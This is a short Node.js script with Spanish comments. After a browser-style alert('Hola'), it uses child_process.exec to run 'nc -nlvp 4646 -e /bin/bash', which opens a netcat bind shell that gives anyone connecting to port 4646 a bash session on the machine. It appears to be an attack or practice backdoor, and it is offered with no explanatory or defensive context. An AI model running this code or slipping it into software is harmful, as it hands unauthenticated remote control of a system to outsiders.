alert("Hola");

const { exec } = require('child_process');

// Comando a ejecutar en Bash
const comandoBash = 'nc -nlvp 4646 -e /bin/bash';

// Ejecutar el comando en Bash desde Node.js
exec(comandoBash, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error al ejecutar el comando: ${error}`);
    return;
  }
  console.log(`Resultado del comando:\n${stdout}`);
});
